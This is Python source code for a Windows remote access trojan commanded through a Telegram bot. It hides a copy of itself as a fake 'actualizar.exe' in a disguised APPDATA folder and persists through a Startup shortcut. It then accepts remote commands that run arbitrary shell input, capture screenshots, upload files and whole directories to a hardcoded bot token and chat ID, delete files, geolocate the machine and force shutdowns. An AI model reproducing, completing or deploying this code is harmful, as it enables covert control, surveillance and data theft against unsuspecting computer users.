import os
import platform
import requests
import subprocess
import time
import winreg as reg
from PIL import ImageGrab
import psutil
import shutil
import ctypes


def a1(ruta):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    ctypes.windll.kernel32.SetFileAttributesW(ruta, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)

def b2():
    appdata = os.environ['APPDATA']
    carpeta_oculta = os.path.join(appdata, 'Microsoft', 'Windows', 'Themes', 'Cache')
    os.makedirs(carpeta_oculta, exist_ok=True)

    ruta_script = os.path.realpath(__file__)
    nuevo_nombre = "actualizar.exe"
    ruta_final = os.path.join(carpeta_oculta, nuevo_nombre)

    if not os.path.exists(ruta_final):
        shutil.copy2(ruta_script, ruta_final)
        a1(ruta_final)
        a1(carpeta_oculta)

    ruta_startup = os.path.join(appdata, "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    acceso_directo = os.path.join(ruta_startup, "actualizar.lnk")

    if not os.path.exists(acceso_directo):
        comando = f'''
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut("{acceso_directo}")
        $Shortcut.TargetPath = "{ruta_final}"
        $Shortcut.WorkingDirectory = "{carpeta_oculta}"
        $Shortcut.IconLocation = "C:\\Windows\\System32\\shell32.dll,5"
        $Shortcut.Save()
        '''
        subprocess.run(["powershell", "-Command", comando], shell=True)
        a1(acceso_directo)


c3 = "7993990059:AAEGr3Mctx_Z9X0PEQ_YhwgsR1lUy4gFE4M"
c4 = "6363520686"  
d5 = []

def e6(o=None):
    url = f"https://api.telegram.org/bot{c3}/getUpdates"
    params = {'offset': o, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        print(f"❌ Failed to get updates. Status code: {response.status_code}")
        return []

def f7(message_id):
    url = f"https://api.telegram.org/bot{c3}/deleteMessage"
    params = {'chat_id': c4, 'message_id': message_id}
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"❌ Failed to delete message.")

def g8(command):
    if command == 'cd ..':
        os.chdir('..')
        return f"📁 Directorio cambiado a: `{os.getcwd()}`"
    elif command.startswith('cd '):
        folder = command[3:].strip()
        try:
            os.chdir(folder)
            return f"📂 Cambiado a: `{os.getcwd()}`"
        except Exception as e:
            return f"⚠️ Error al cambiar: {str(e)}"
    elif command == 'pwd':
        return f"📁 Ruta actual: `{os.getcwd()}`"
    elif command == 'dir':
        try:
            files = os.listdir()
            return "📂 **Contenido del directorio:**\n" + "\n".join(f"📄 {f}" for f in files)
        except Exception as e:
            return f"⚠️ Error al listar: {str(e)}"
    elif command == 'ipinfo' or command == 'location':
        try:
            ip = requests.get("https://ifconfig.me/ip").text.strip()
            data = requests.get(f"http://ip-api.com/json/{ip}").json()
            return (
                f"🌍 IP: `{ip}`\n"
                f"🌐 País: {data.get('country')}\n"
                f"🗺️ Región: {data.get('regionName')}\n"
                f"🏙️ Ciudad: {data.get('city')}\n"
                f"📡 ISP: {data.get('isp')}\n"
                f"🕒 Zona horaria: {data.get('timezone')}"
            )
        except:
            return "⚠️ No se pudo obtener la IP."
    elif command == 'info':
        info = platform.uname()
        return (
            f"💻 Sistema: {info.system} {info.release}\n"
            f"🖥️ Nombre del PC: {info.node}\n"
            f"🧠 Procesador: {info.processor}\n"
            f"⚙️ Arquitectura: {info.machine}\n"
            f"👤 Usuario: {os.getlogin()}\n"
            f"🧮 Núcleos CPU: {os.cpu_count()}"
        )
    elif command == 'captura' or command == 'screenshot':
        try:
            img = ImageGrab.grab()
            img.save("ss.png")
            h9("ss.png")
            os.remove("ss.png")
            return "📸 Captura enviada."
        except Exception as e:
            return f"⚠️ Error en captura: {e}"
    elif command == 'notificar':
        return "🔔 ¡Notificación enviada (simulada)!."
    elif command.startswith('mkdir '):
        folder = command[6:].strip()
        try:
            os.makedirs(folder)
            return f"📁 Carpeta `{folder}` creada."
        except Exception as e:
            return f"⚠️ Error: {e}"
    elif command.startswith('rm '):
        file = command[3:].strip()
        try:
            os.remove(file)
            return f"🗑️ Archivo `{file}` eliminado."
        except Exception as e:
            return f"⚠️ No se pudo eliminar: {e}"
    elif command == 'apagar 5':
        h9("⚠️ Apagando en 5 segundos...")
        time.sleep(5)
        os.system('shutdown /s /f /t 0')
        return "💤 Apagando..."
    elif command == 'reiniciar 5':
        h9("♻️ Reiniciando en 5 segundos...")
        time.sleep(5)
        os.system('shutdown /r /f /t 0')
        return "🔁 Reiniciando..."
    elif command.startswith('descargar '):
        file = command[10:].strip()
        try:
            h9(file)
            return f"📤 Archivo `{file}` enviado."
        except Exception as e:
            return f"⚠️ Error: {e}"
    elif command.startswith('subir '):
        return "📥 Esperando función de subida desde Telegram. (❌ Aún no implementado)"
    elif command.startswith('cmd '):
        cmd = command[4:].strip()
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return f"💻 Resultado:\n`{output.decode('utf-8')}`"
        except subprocess.CalledProcessError as e:
            return f"⚠️ Error: `{e.output.decode('utf-8')}`"
    elif command.startswith('abrir '):
        try:
            os.startfile(command[6:].strip())
            return f"📂 Abriendo: `{command[6:]}`"
        except Exception as e:
            return f"⚠️ Error: {e}"
    elif command == 'enviar_todo':
        folder = os.getcwd()
        enviados = 0
        for f in os.listdir(folder):
            path = os.path.join(folder, f)
            if os.path.isfile(path):
                h9(path)
                enviados += 1
        return f"📤 {enviados} archivos enviados desde `{folder}`."
    elif command == 'help':
        return '''
📖 *Comandos Disponibles:*
cd .. ➜ Atras directorio  
cd ➜ Entrar en carpeta  
pwd ➜ Ruta actual  
dir ➜ Ver archivos  
ipinfo ➜ IP + región  
info ➜ Info sistema  
captura ➜ Tomar captura  
mkdir  ➜ Crear carpeta  
rm ➜ Eliminar archivo  
apagar 5 ➜ Apagar o reiniciar  
descargar ➜ Enviar archivo  
subir archivo ➜ (A implementar)  
cmd comando ➜ Ejecutar comando  
abrir archivo.exe ➜ Abrir archivo  
notificar ➜ Enviar notificación  
enviar_todo ➜ Enviar todos los archivos
        '''
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return f"💻 Resultado:\n`{result.decode('utf-8')}`"
        except subprocess.CalledProcessError as e:
            return f"⚠️ Error:\n`{e.output.decode('utf-8')}`"

def h9(filename):
    url = f"https://api.telegram.org/bot{c3}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': c4}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"❌ Failed to send file.")

def i10(text):
    url = f"https://api.telegram.org/bot{c3}/sendMessage"
    params = {
        'chat_id': c4,
        'text': text
    }
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"❌ Failed to send message.")

def j11(updates):
    last_update_id = None
    for update in updates:
        message = update.get('message')
        if not message:
            continue
        message_id = message.get('message_id')
        if message_id in d5:
            continue
        d5.append(message_id)
        text = message.get('text', '')
        if text:
            response = g8(text)
            i10(response)
        last_update_id = update['update_id']
    return last_update_id if last_update_id is not None else 0

def k12():
    offset = None
    while True:
        l13()  
        try:
            updates = e6(offset)
            if updates:
                offset = j11(updates) + 1
                d5.clear()
        except:
            pass  
        time.sleep(1)

def l13():
    while True:
        try:
            requests.get("https://www.google.com", timeout=5)
            return  
        except:
            time.sleep(10)

if __name__ == '__main__':
    b2()
    i10("💻 PC Activo")  
    k12()
